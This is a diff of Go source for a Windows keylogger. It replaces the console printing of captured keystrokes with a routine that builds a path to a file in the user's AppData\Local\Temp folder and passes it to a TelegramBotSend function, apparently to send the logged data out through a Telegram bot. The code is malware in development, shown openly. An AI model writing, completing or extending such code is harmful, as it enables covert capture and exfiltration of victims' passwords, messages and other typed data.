@@ -3,8 +3,9 @@ package main
 
 import (
 	"fmt"
+	"log"
+	"os/user"
 	"syscall"
-	"time"
 	"unicode/utf8"
 	"unsafe"
 
@@ -116,16 +117,34 @@ func (kl Keylogger) ParseKeycode(keyCode int) Key {
 	return key
 }
 
-func main() {
-	kl := NewKeyLogger()
-
-	for {
-		key := kl.PressedKey()
-
-		if !key.Empty {
-			fmt.Printf("'%c'\n", key.Rune)
-		}
-
-		time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
+func Path() string {
+	usr, err := user.Current()
+	if err != nil {
+		log.Fatalf(err.Error())
 	}
+	path := usr.HomeDir + "\\AppData\\Local\\Temp\\sec-003.txt"
+	return path
+}
+
+func main() {
+
+	fmt.Println()
+	//file, err := os.Create(path)
+	//if err != nil {
+	//	log.Fatal(err)
+	//}
+
+	//kl := NewKeyLogger()
+	//
+	//for {
+	//	key := kl.PressedKey()
+	//
+	//	if !key.Empty {
+	//		fmt.Printf("'%c'\n", key.Rune)
+	//	}
+	//
+	//	time.Sleep(TIME_UNTIL_CAPTURE * time.Millisecond)
+	//}
+
+	TelegramBotSend(Path())
 }
